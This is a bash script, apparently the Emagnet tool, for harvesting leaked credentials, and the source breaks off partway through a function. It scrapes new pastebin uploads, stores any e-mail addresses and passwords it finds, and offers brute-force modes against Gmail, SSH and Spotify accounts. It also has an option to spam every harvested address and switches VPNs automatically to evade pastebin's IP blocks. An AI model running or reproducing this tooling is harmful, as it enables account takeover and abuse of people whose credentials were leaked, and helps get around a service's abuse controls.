#!/bin/bash
################################################################################
################################################################################
####                                                                       #####
#### A notice to all nerds.                                                #####
#### If you will copy developers real work it will not make you a hacker.  #####
#### Resepect all developers, we doing this because it's fun!              #####
####                                                                       #####
################################################################################
################################ SOURCE CODE ###################################
################################################################################
###################### EMAGNET WAS FOUNDED BY WUSEMAN ##########################
################################################################################
####                                                                       #####
####  Emagnet - A tool for find all latest leaked databases                #####
####  Copyright (C) 2018-2019, wuseman                                     #####
####                                                                       #####
####  This program is free software; you can redistribute it and/or modify #####
####  it under the terms of the GNU General Public License as published by #####
####  the Free Software Foundation; either version 2 of the License, or    #####
####  (at your option) any later version.                                  #####
####                                                                       #####
####  This program is distributed in the hope that it will be useful,      #####
####  but WITHOUT ANY WARRANTY; without even the implied warranty of       #####
####  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #####
####  GNU General Public License for more details.                         #####
####                                                                       #####
####  You must obey the GNU General Public License. If you will modify     #####
####  emagnet file(s), you may extend this exception to your version       #####
####  of the file(s), but you are not obligated to do so.  If you do not   #####
####  wish to do so, delete this exception statement from your version.    #####
####  If you delete this exception statement from all source files in the  #####
####  program, then also delete it here.                                   #####
####                                                                       #####
####  Contact:                                                             #####
####          IRC: Freenode @ wuseman                                      #####
####          Mail: wuseman <wuseman@nr1.nu>                               #####
####                                                                       #####
################################################################################
######## The Nr1 tool for find latest leaked databases online @ 2o18 ###########
################################################################################


emagnet_banner() {
cat << "EOF"
     _                      _______                      _
  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_
 dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb
 V      ~"Mb          dOOOOOOOOOOOOOOOOOb          dM"~      V
          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'
           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'
      __     `YMMM| OP'~"YOOOOOOOOOOOP"~`YO |MMMP'     __
    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.
 _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._
             `YMMMM\`OOOo     OOO     oOOO'/MMMMP'
     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.
   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.
  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.
  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM
  YMb           ~YMMMM\`OOOOI`````IOOOOO'/MMMMP~           dMP
   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'
     `'                  `OObNNNNNdOO'                   `'
                           `~OOOOO~'

EOF
printf "%64s \n\n" | tr ' ' '='
}

emagnet_usage() {
cat << EOF

Usage: ./$basename$0 [--author] [--emagnet] [--option] .....

  -a, --author        Show author information.
  -b, --backup        Create a compressed archive
                      - Available options: all/incoming/archive
  -l, --license       Show license information.
  -h, --help          Display this very helpful text
  -n, --notify        Set notifications on or off
  -t, --time          Set refresh time in seconds
  -v, --vpn           Toggle VPN on or off (Linux Only)
                      - Available options: true/false
  -V, --version       Displays version information.
  -i, --ip            Print you current WAN IPv4/IPv6
  -e, --emagnet       Download latest uploaded files on pastebin
                      and store e-mail addresses and passwords
                      in sorted day directories.
  -g, --bruteforce    Same as above '-e' with brute-force mode on
                      - Available options: gmail/ssh/spotify (ssh not available on android)
  -k, --kill          Kill emagnet ghost sessions
  -m, --merge         Merge all log files from incoming to archive
  -M, --move          Move all downloaded files to archive
  -s, --spam          Send an email to all email addresses
  -q, --quiet         Run emagnet in a screen
  -x, --syntax        Download uploads sorted by syntax
                       - Valid syntaxes available on pastebin.com/languages

EOF
}

CONF="$HOME/.config/emagnet/emagnet.conf"
emagnet_mustberoot() {(( ${EUID} > 0 )) && printf "%s\n" "$basename$0: internal error -- root privileges is required" && exit 1;  }
emagnet_conf() { CONF="$HOME/.config/emagnet/emagnet.conf";. "$CONF" ;}
emagnet_clear() { clear ; }
emagnet_iconnection() { ping -i "0.2" -c 1 1.1.1.1 &> /dev/null;if [[ "$?" -gt "0" ]];then echo -e "$basename$0: internal error -- no internet connection, can't continue"; exit 1;fi; }
emagnet_license() { printf "%s\n" "Printing LICENSE - Use 'q' to quit";sleep 2;curl -s "https://nr1.nu/licenses/LICENSE.md"|less;printf "%s\n" "Thank you.." ;}
emagnet_required_stuff() { cp "./emagnet.conf" $HOME/.config/emagnet/; if ! [[ -d "$HOME/.config/emagnet/" ]]; then mkdir -p "$HOME/.config/emagnet/";mkdir -p "$HOME/.config/emagnet/tmp";fi;}
emagnet_is_this_android() { adb shell getprop &> /dev/null; [[ "$?" -eq "0" ]] && sed -i '204d' "$CONF"; sed -i '204 i ANDROID=true' "$CONF" ;}
emagnet_requirements() { for cmd in wget curl; do hash $cmd; if [[ "$?" -gt 0 ]]; then echo "$cmd is required to be installed, exiting."; exit 1;fi;done; }
emagnet_optional() { sleep 0 ;}

emagnet_mustbefilled() {
  if [[ -z "$DEBUG"          ]];then sed -i "12d"  "$CONF";sed -i '12  i DEBUG=false'                                                                                                             "$CONF";fi
  if [[ -z "$PASTEBIN"       ]];then sed -i '21d'  "$CONF";sed -i '21  i PASTEBIN=https:\/\/www.pastebin.com'                                                                                     "$CONF";fi
  if [[ -z "$WIP"            ]];then sed -i '50d'  "$CONF";sed -i '50  i WIP=https:\/\/nr1.nu\/i\/'                                                                                               "$CONF";fi
  if [[ -z "$WIP2"           ]];then sed -i '51d'  "$CONF";sed -i '51  i WIP2='                                                                                                                   "$CONF";fi
  if [[ -z "$WIP3"           ]];then sed -i '52d'  "$CONF";sed -i '52  i WIP3='                                                                                                                   "$CONF";fi
  if [[ -z "$WIP4"           ]];then sed -i '53d'  "$CONF";sed -i '53  i WIP4='                                                                                                                   "$CONF";fi
  if [[ -z "$TIME"           ]];then sed -i '30d'  "$CONF";sed -i "30  i TIME=150"                                                                                                                "$CONF";fi
  if [[ -z "$MYIP"           ]];then sed -i '40d'  "$CONF";sed -i "40  i MYIP=$(curl -s https://nr1.nu/i/)"                                                                                       "$CONF";fi
  if [[ -z "$EMAGNET"        ]];then sed -i '72d'  "$CONF";sed -i '72  i EMAGNET=$HOME/emagnet'                                                                                                   "$CONF";fi
  if [[ -z "$EMAGNETHOME"    ]];then sed -i "73d"  "$CONF";sed -i '73  i EMAGNETHOME=$EMAGNET\/incoming\/$(date +%Y-%m-%d)'                                                                       "$CONF";fi
  if [[ -z "$EMAGNETLOGS"    ]];then sed -i "74d"  "$CONF";sed -i '74  i EMAGNETLOGS=$EMAGNETHOME/logs'                                                                                           "$CONF";fi
  if [[ -z "$EMAGNETPW"      ]];then sed -i "75d"  "$CONF";sed -i '75  i EMAGNETPW=$EMAGNETHOME\/password-files'                                                                                  "$CONF";fi
  if [[ -z "$EMAGNETALL"     ]];then sed -i "76d"  "$CONF";sed -i '76  i EMAGNETALL=$EMAGNETHOME\/all-files'                                                                                      "$CONF";fi
  if [[ -z "$EMAGNETCRAP"    ]];then sed -i "77d"  "$CONF";sed -i '77  i EMAGNETCRAP=$EMAGNETHOME\/.pastebin'                                                                                     "$CONF";fi
  if [[ -z "$EMAGNETTEMP"    ]];then sed -i "78d"  "$CONF";sed -i '78  i EMAGNETTEMP=$EMAGNETHOME\/.temp'                                                                                         "$CONF";fi
  if [[ -z "$EMAGNETARCHIVE" ]];then sed -i "79d"  "$CONF";sed -i '79  i EMAGNETARCHIVE=$EMAGNET/archive'                                                                                         "$CONF";fi
  if [[ -z "$EMAGNETDB"      ]];then sed -i "80d"  "$CONF";sed -i '80  i EMAGNETDB=$EMAGNETHOME\/email-files'                                                                                     "$CONF";fi
  if [[ -z "$EMAGNETBACKUP"  ]];then sed -i "81d"  "$CONF";sed -i '81  i EMAGNETBACKUP=$EMAGNET/backup'                                                                                           "$CONF";fi
  if [[ -z "$EMAGNETSYNTAX"  ]];then sed -i "82d"  "$CONF";sed -i '82  i EMAGNETSYNTAX=$EMAGNETHOME\/sorted-by-syntax'                                                                            "$CONF";fi
  if [[ -z "$VERSION"        ]];then sed -i '91d'  "$CONF";sed -i '91  i VERSION=3.4'                                                                                                             "$CONF";fi
  if [[ -z "$THREADS"        ]];then sed -i '100d' "$CONF";sed -i "100 i THREADS=$(( NUMCPUS + 1 ))"                                                                                              "$CONF";fi
  if [[ -z "$IDLETIME"       ]];then sed -i '109d' "$CONF";sed -i "109 i IDLETIME=3600"                                                                                                           "$CONF";fi
  if [[ -z "$GBRUTEFORCE"    ]];then sed -i '125d' "$CONF";sed -i '125 i GBRUTEFORCE=false'                                                                                                       "$CONF";fi
  if [[ -z "$SBRUTEFORCE"    ]];then sed -i '126d' "$CONF";sed -i '126 i SBRUTEFORCE=false'                                                                                                       "$CONF";fi
  if [[ -z "$PBRUTEFORCE"    ]];then sed -i '127d' "$CONF";sed -i '127 i PBRUTEFORCE=false'                                                                                                       "$CONF";fi
  if [[ -z "$ABRUTEFORCE"    ]];then sed -i '128d' "$CONF";sed -i '128 i ABRUTEFORCE=tempalate'                                                                                                   "$CONF";fi
  if [[ -z "$BBRUTEFORCE"    ]];then sed -i '129d' "$CONF";sed -i '129 i BBRUTEFORCE=template'                                                                                                    "$CONF";fi
  if [[ -z "$CBRUTEFORCE"    ]];then sed -i '130d' "$CONF";sed -i '130 i CBRUTEFORCE=template'                                                                                                    "$CONF";fi
  if [[ -z "$DBRUTEFORCE"    ]];then sed -i '131d' "$CONF";sed -i '131 i DBRUTEFORCE=template'                                                                                                    "$CONF";fi
  if [[ -z "$EBRUTEFORCE"    ]];then sed -i '132d' "$CONF";sed -i '132 i EBRUTEFORCE=template'                                                                                                    "$CONF";fi
  if [[ -z "$EMAIL2SEND"     ]];then sed -i '141d' "$CONF";sed -i '141 i EMAIL2SEND='                                                                                                             "$CONF";fi
  if [[ -z "$NOTIFY"         ]];then sed -i '150d' "$CONF";sed -i '150 i NOTIFY=false'                                                                                                            "$CONF";fi
  if [[ -z "$VPN"            ]];then sed -i '162d' "$CONF";sed -i '162 i VPN=false'                                                                                                               "$CONF";fi
  if [[ -z "$VPNROOT"        ]];then sed -i '163d' "$CONF";sed -i '163 i VPNROOT=/etc/openvpn'                                                                                                    "$CONF";fi
  if [[ -z "$VPNPROVIDER"    ]];then sed -i '164d' "$CONF";sed -i '164 i VPNPROVIDER=$VPNROOT/'                                                                                                   "$CONF";fi
  if [[ -z "$VPNPROVIDER2"   ]];then sed -i '165d' "$CONF";sed -i '165 i VPNPROVIDER2=$VPNROOT/'                                                                                                  "$CONF";fi
  if [[ -z "$VPNPROVIDER3"   ]];then sed -i '166d' "$CONF";sed -i '166 i VPNPROVIDER3=$VPNROOT/'                                                                                                  "$CONF";fi
  if [[ -z "$VPNCOUNTRYS"    ]];then sed -i '167d' "$CONF";sed -i '167 i VPNCOUNTRYS="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'   "$CONF";fi
  if [[ -z "$VPNCOUNTRYS2"   ]];then sed -i '168d' "$CONF";sed -i '168 i VPNCOUNTRYS2="argentina australia brazil denmark finland france germany hong iceland india ireland sweden"'              "$CONF";fi
  if [[ -z "$VPNCOUNTRYS3"   ]];then sed -i '169d' "$CONF";sed -i '169 i VPNCOUNTRYS3="belgium bulgaria czhech denmark spain finland uk uk-london uk-manchester greece hongkong hungaria italy"'  "$CONF";fi
  if [[ -z "$SSHUSER"        ]];then sed -i '181d' "$CONF";sed -i '181 i SSHUSER="root"'                                                                                                          "$CONF";fi
  if [[ -z "$SSHPORT"        ]];then sed -i '182d' "$CONF";sed -i '182 i SSHPORT="22"'                                                                                                            "$CONF";fi
  if [[ -z "$SSHPASS"        ]];then sed -i '183d' "$CONF";sed -i '183 i SSHPASS='                                                                                                                "$CONF";fi
  if [[ -z "$SSHTARGETS"     ]];then sed -i '184d' "$CONF";sed -i '184 i SSHTARGETS="$HOME/.config/emagnet/tmp/.emagnet-sshbruter.txt"'                                                           "$CONF";fi
  if [[ -z "$SSHPORTSCAN"    ]];then sed -i '185d' "$CONF";sed -i '185 i SSHPORTSCAN="$HOME/.config/emagnet/tmp/.emagnet-portscan"'                                                               "$CONF";fi
  if [[ -z "$USERAGENT"      ]];then sed -i '195d' "$CONF";sed -i '195 i USERAGENT=Mosaic/0.9'                                                                                                    "$CONF";fi
  if [[ -z "$ANDROID"        ]];then sed -i '204d' "$CONF";sed -i '204 i ANDROID=false'                                                                                                           "$CONF";fi
}

emagnet_paths() {
PATHS="${EMAGNETHOME} ${EMAGNETDB} ${EMAGNETPW} ${EMAGNETTEMP} ${EMAGNETCRAP} ${EMAGNETALL} ${EMAGNETARCHIVE} ${EMAGNETLOGS}"
for DIRS in ${PATHS}; do ! [[ -d "${DIRS}" ]] && mkdir -p "${DIRS}" &> /dev/null; done
}

emagnet_author() {
cat << "EOF"

 Copyright (C) 2018-2019, wuseman

 Emagnet was founded in 2015 and was released as open source
 on github.com/wuseman/emagnet in January 2018 and is licensed
 under GNU LESSER GENERAL PUBLIC LICENSE GPLv3

   - Author: wuseman <wuseman@nr1.nu>
   - IRC   : wuseman <irc.freenode.com>

 Please report bugs/issues on:

   - https://github.com/wuseman/EMAGNET/issues

EOF
}

emagnet_quiet() {
  emagnet_conf
  pid="$(ps aux |grep emagnet)"
  printf "$basename$0: emagnet has been started in background (pid:$(ps aux|grep "SCREEN -dmS emagnet"|awk '{print $2}'|head -n1))\n"
  screen -S "emagnet" -dm bash "$basename$0" --emagnet
}

emagnet_notice_about_scraping() {
   emagnet_clear
   emagnet_banner
   echo -e "                            \e[1;31mNOTICE\e[0m:\n"
   echo -e "[\e[1;31m<<\e[0m] - You are scraping pastbin.com way too fast! \e[1;31mSlow Down\e[0m!"
   echo -e "[\e[1;31m<<\e[0m] - Pastebin has blocked you from the archive page until you slow down."
   echo -e "[\e[1;31m<<\e[0m] - You will only be able to download 8 files at time until you raise TIME"
   echo -e "[\e[1;31m<<\e[0m] - The block from pastebin.com/archive will be lifted within 20 minutes.."
   sleep 7
   emagnet_clear
   emagnet_banner
 }

emagnet_kill() {
ESESSIONS=$(ps aux|grep -i "emagnet"|sed '$d'|awk '{print $2}')
NRESESSIONS=$(ps aux|grep -i "emagnet"|sed '$d'|awk '{print $2}'|wc -l)
NRINSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g'|wc -l)"
INSCREEN="$(screen -ls |grep emagnet|awk -F"." '{print $1}'|sed 's/\t//g')"

 if [[ "$INSCREEN" -gt "0" ]]; then for screens in "$INSCREEN"; do screen -X -S "$screens" kill; [[ "$?" = "0" ]] &&  echo -e "[\e[1;31m<<\e[0m] - $NRINSCREEN emagnet screens has been killed\n"; done;fi
 if [[ "$NRESESSIONS" -lt "3" ]]; then echo -e "$basename$0: internal error -- 0 emagnet sessions is currently running";else echo -e "$basename$0: killed $(echo $NRESESSIONS-2|bc) emagnet sessions"
                                       kill -SIGKILL "$ESESSIONS" &> /dev/null;fi
}

emagnet_heavyload() {
curl -sL -H "$USERAGENT" "$PASTEBIN" \
|grep -q "is under heavy load right now"
if [[ "$?" = "0" ]]; then
  for (( ; ; )); do
   wait_time=60
   temp_cnt="${wait_time}"
     while [[ "${temp_cnt}" -gt 0 ]]; do
        printf "\rPastebin is currently under heavy load, let's wait: \e[1;1m%1d\e[0m" ${temp_cnt}
        printf " seconds"
        sleep 1
        ((temp_cnt--))
     done
    echo
 	bash "$basename$0" --emagnet
 done
 	bash "$basename$0" --emagnet
fi
}

emagnet_I_was_banned() {
    curl -sL "$PASTEBIN" -H "$USERAGENT" \
    |grep -q "blocked your IP"

	if [[ "$?" = "0" ]]; then
  		if [[ "$VPN" = "false" ]]; then
           emagnet_clear
           emagnet_banner
   	   			for (( ; ; )); do
     			   wait_time=${IDLETIME}
      		           temp_cnt=${wait_time}
   				while [[ "${temp_cnt}" -gt "0" ]]; do
                           printf "\rIP: [\e[1;31m$(curl -s $WIP)\e[0m] has been blocked, continues in \e[1;1m%1d\e[0m" ${temp_cnt}
      			           printf " seconds"
      				       sleep 1
      		               ((temp_cnt--))
  	            done
                                   printf "\n"
                                   emagnet_clear
                                   emagnet_banner
                                   bash "$basename$0" --emagnet
                                   sleep 2
            done
                                   emagnet_clear
                                   emagnet_banner
         			               bash "$basename$0" --emagnet
        			               exit 1
     else
         			               emagnet_banned
  fi
fi
}

emagnet_vpnsetup() {
emagnet_mustberoot
( hash openvn &> /dev/null; [[ $? -eq "0" ]] && echo -e "$basename$0: internal error -- openvpn is required to be installed when enabling vpn"; exit )
VPNCONFIG=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF |cut -d'"' -f1|head -2|sed '1d')
VPNCONFIG2=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF|cut -d'"' -f1|head -2|tail -1)
VPNCONFIG3=$(awk -F'/' '/VPNPROVIDER/ {print $2}' $CONF|cut -d'"' -f1|head -3|tail -1)

if [[ -z "$VPNPROVIDER" || -n "$VPNPROVIDER2" ]]; then
	    export VPNCONFIG="$VPNCONFIG2"
        export VPNCOUNTRYS="$VPNCOUNTRYS2"
 elif [[ -z "$VPNPROVIDER" || -z "$VPNPROVIDER2" || -n "$VPNPROVIDER3" ]]; then
	    export VPNCONFIG="$VPNCONFIG3"
        export VPNCOUNTRYS="$VPNCOUNTRYS3"
 else
     	export VPNCONFIG="$VPNCONFIG"
        export VPNCOUNTRYS="$VPNCOUNTRYS"
fi

  case "$COUNTRY" in
     "belgium")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.be.ovpn"  &> /dev/null & ;;
     "bulgaria")       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.bg.ovpn"  &> /dev/null & ;;
     "czech")          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.cz.ovpn"  &> /dev/null & ;;
     "denmark")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.dk.ovpn"  &> /dev/null & ;;
     "spain")          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.es.ovpn"  &> /dev/null & ;;
     "finland")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.fi.ovpn"  &> /dev/null & ;;
     "united-kingdom") cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.gb.ovpn"  &> /dev/null & ;;
     "greece")         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.gr.ovpn"  &> /dev/null & ;;
     "hongkong")       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.hk.ovpn"  &> /dev/null & ;;
     "hungaria")       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.hu.ovpn"  &> /dev/null & ;;
     "italy")          cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.it.ovpn"  &> /dev/null & ;;
     "moldavia")       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.md.ovpn"  &> /dev/null & ;;
     "netherlands")    cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.nl.ovpn"  &> /dev/null & ;;
     "norway")         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.no.ovpn"  &> /dev/null & ;;
     "poland")         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.pl.ovpn"  &> /dev/null & ;;
     "portugal")       cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.pt.ovpn"  &> /dev/null & ;;
     "romania")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.ro.ovpn"  &> /dev/null & ;;
     "russia")         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.rs.ovpn"  &> /dev/null & ;;
     "sweden")         cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se.ovpn"  &> /dev/null & ;;
     "sweden1")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se.ovpn"  &> /dev/null & ;;
     "sweden2")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se2.ovpn" &> /dev/null & ;;
     "sweden3")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se3.ovpn" &> /dev/null & ;;
     "sweden4")        cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.se4.ovpn" &> /dev/null & ;;
     "united-states")  cd "$VPNPROVIDER";openvpn --config "$VPNCONFIG.us.ovpn"  &> /dev/null & ;;
  esac
}

emagnet_banned() {
if [[ "$VPN" = "false" ]]; then
   emagnet_I_was_banned
else
  line='...........................................................'
  line1='................................[ ok ]'
  line2='...............................................'
  OPENVPNRUNNING="$(ps aux |grep openvpn|sed '1d')"
  MYIP="$(curl -s https://nr1.nu/i/)"
  MYCOUNTRY="$(curl -s https://nr1.nu/i/|xargs whois|grep -i COUNTRY|awk '{print tolower($2)}')"
  COUNTRY=$(awk -F'="' '/VPNCOUNTRYS="/ {print $2}' $CONF|sed 's/"//g'|tr ' ' '\n'|sort -R | sed 's/.*[0-9]\t//'|shuf -n1)

      curl -H "$USERAGENT" -Ls "$WIP" > "$HOME/.config/emagnet/tmp/.emagnet-ip"
 
      if [[ -n "$OPENVPNRUNNING" ]]; then pkill -9 "openvpn"; fi
	    emagnet_clear
	    emagnet_banner
	    printf "\e[1;31m                You have been blocked by pastebin...\n\n\e[0m"
	    printf "%s${line2:${#MYIP}}[ ok ]\n" "Current IP: $MYIP"
	    printf "Connecting to "
	    printf "\e[1m%s\e[0m%s \e[1;37m%s\e[0m" $COUNTRY ", please wait${line1:${#COUNTRY}}"
	    printf "\n"
        emagnet_vpnsetup
        sleep 10
        MYIP="$(curl -s https://nr1.nu/i/)"
        MYOLDIP="$(cat $HOME/.config/emagnet/tmp/.emagnet-ip)"

	    if [[ "$MYIP" != "$MYOLDIP" ]]; then
                rm "$HOME/.config/emagnet/tmp/.emagnet-ip" &> /dev/null
                MYNEWIP=$(printf "Successfully connected to $(echo  "$(curl -s https://nr1.nu/i/)")")
                printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
                printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
                sleep 5
        fi
                     if [[ "$MYIP" = "$MYOLDIP" ]]; then
                         echo -e "Still trying to establish a connection.....................[\e[1;3m\e[5mwait\e[0m\e[0m]"
                         sleep 10

			            if [[ ! $MYIP = "$MYOLDIP" ]]; then
                                rm "$HOME/.config/emagnet/tmp/.emagnet-ip" &> /dev/null
                                MYNEWIP=$(echo -e "Successfully connected to $(curl -s https://nr1.nu/i/)")
                                printf "%s%s[ ok ]\n" "$MYNEWIP" "${line:${#MYNEWIP}}"
                                printf "\rEmagnet will continue in 5 seconds.........................[ ok ]\n\n"
                                sleep 5
                          else
                                echo -e "It seems to be some trouble with the connection, aborted...[\e[1;31mfail\e[0m]\n"
                                exit 1
                       fi
                    fi
            fi
}

emagnet_analyzing_message() {
    text="Analyzing..."
    delay="0.1"

if [[ "$GBRUTEFORCE" = "true" ]]; then
           printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
           printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
           printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
	  else
           sleep 0
fi
           printf "%26s"; for analyzing in $(seq 0 $(expr length "${text}")); do echo -n "${text:$analyzing:1}";sleep "${delay}";done
}

emagnet_merge() {
EMPTY="$(ls $EMAGNET/incoming/*/logs/|wc -l)"
if [[ "$EMPTY" -lt "1" ]]; then echo -e "$basename$0: internal error -- nothing to merge";exit 1;fi
DAYDIRS="$(ls $EMAGNET/incoming/|wc -l)"
DAYDIRS2="$(ls $EMAGNET/incoming/)"
LOGFILES="$(ls $EMAGNET/incoming/*/logs/*|wc -l)"
TOTM="$(cat $EMAGNET/incoming/*/logs/emails-from-pastebin.txt|wc -l)"         # Total Mail Addresses
TOTP="$(cat $EMAGNET/incoming/*/logs/passwords-from-pastebin.txt|wc -l)"      # Total passwords
TOTU="$(cat $EMAGNET/incoming/*/logs/pastebin-urls.txt|wc -l)"                # Total Urls

	emagnet_clear
	emagnet_banner

          printf "%10s Merging \e[1;36m${LOGFILES}\e[0m log files from \e[1;36m${DAYDIRS}\e[0m day directories\n\n"
	      printf "%64s \n\n" | tr ' ' '='
	        LOGDATE="$(ls $EMAGNET/incoming/|xargs|sed 's/ /, /g')"
             for LOGDATE2 in "$(ls $EMAGNET/incoming/)"; do
                echo -e ",-> Merging logs from: $LOGDATE \n|"
                logfiles="cracked-ssh-passwords.txt cracked-gmail-passwords.txt cracked-spotify-passwords.txt emagnet.log emails-from-pastebin.txt passwords-from-pastebin.txt pastebin-urls.txt"
                  find $EMAGNET/incoming/*/logs/ -maxdepth 1|sed '/\/$/d' > $HOME/emagnet/.emagnet-temp-merge.txt
                      touch "$EMAGNETARCHIVE/logs/$logfiles" &> /dev/null
                      while read logs; do 
                      	echo "$logs" >> "$EMAGNETARCHIVE/logs/$logfiles"; 
                      	         if [[ "$?" -eq "0" ]]; then
                                 printf "| %2d) [MERGED] %.100s %s\n" "$(( ++cnt ))" "$logs'"
             	                 
             	                 sleep 1
                             else
		                	     printf "\n| %2d) [FAILED] %.31s %s" "$(( ++cnt ))" "$logs"
               	                
               	                 sleep 1
                            fi
                       done < $HOME/emagnet/.emagnet-temp-merge.txt
                                 sleep 0.2
                 done
                                 printf "|\n"
                                 sleep 0.2
                                 printf "'- Successfully merged \e[1;32m${TOTM}\e[0m emails, \e[1;34m${TOTP}\e[0m passwords and \e[1;36m${TOTU}\e[0m urls...\n\n"
}

emagnet_analyzer() {
emagnet_clear
emagnet_banner
if [[ "$GBRUTEFORCE" = "true" ]]; then
           printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
           printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
           printf "%20s \e[0;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
           printf "%64s \n\n" | tr ' ' '='
	  else
            sleep 0
fi

wait_time=$TIME
temp_cnt=${wait_time}
          while [[ "${temp_cnt}" -gt "0" ]]; do
              printf "\r         I'll Will Find You <-%2d -> It's A Matter Of Time" ${temp_cnt}
              sleep 1
              ((temp_cnt--))
          done
}

emagnet_move_files() {
EMPTY="$(ls $EMAGNET/incoming/*/*/|wc -l)"
if [[ "$EMPTY" -lt "1" ]]; then
   echo -e "$basename$0: internal error -- there is nothing to move"
   exit 1
fi

  if [[ ! -d "$EMAGNETARCHIVE/emagnet" ]]; then
    mkdir -p "$EMAGNETARCHIVE/all-files"
    mkdir -p "$EMAGNETARCHIVE/email-files"
    mkdir -p "$EMAGNETARCHIVE/password-files"
    mkdir -p "$EMAGNETARCHIVE/logs"
  fi
        printf "%s\n" "Copying all files from incoming/ dirs to archive/"
	        cp -rn $EMAGNET/incoming/*/all-files/* $EMAGNETARCHIVE/all-files/
     		cp -rn $EMAGNET/incoming/*/email-files/* $EMAGNETARCHIVE/email-files/
    		cp -rn $EMAGNET/incoming/*/password-files/* $EMAGNETARCHIVE/password-files/
        printf "%s\n\n" "Done.."

read -p "Wipe incoming directories (y/n): " cleanup
   if [[ "$cleanup" = "y" ]]; then
      rm -rf "$EMAGNET/incoming/"
      printf "\e[1;31mWiped\e[0m: $EMAGNET/incoming..\nDone..\n"
    else
      printf "\nAborted..\n"
   fi
}

emagnet_count_down() {
            emagnet_paths
            emagnet_conf
if [[ "$GBRUTEFORCE" = "true" ]]; then
       	    sed -i '125d' "$CONF"
      	    sed -i '125 i GBRUTEFORCE=true' "$CONF"
      	    sed -i '126d' "$CONF"
      	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
            sed -i '127d' "$CONF"
      	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
            emagnet_conf
            printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
            printf "\n%64s \n\n" | tr ' ' '='
            emagnet_analyzer
	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
      	    sed -i '125d' "$CONF"
     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
      	    sed -i '126d' "$CONF"
	        sed -i '126 i SBRUTEFORCE=true' "$CONF"
	        sed -i '127d' "$CONF"
     	    sed -i '127 i PBRUTEFORCE=false' "$CONF"
            emagnet_conf
            printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
            printf "\n%64s \n\n" | tr ' ' '='
            emagnet_analyzer
	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
	        sed -i '125d' "$CONF"
     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
      	    sed -i '126d' "$CONF"
     	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
            sed -i '127d' "$CONF"
     	    sed -i '127 i PBRUTEFORCE=true' "$CONF"
            emagnet_conf
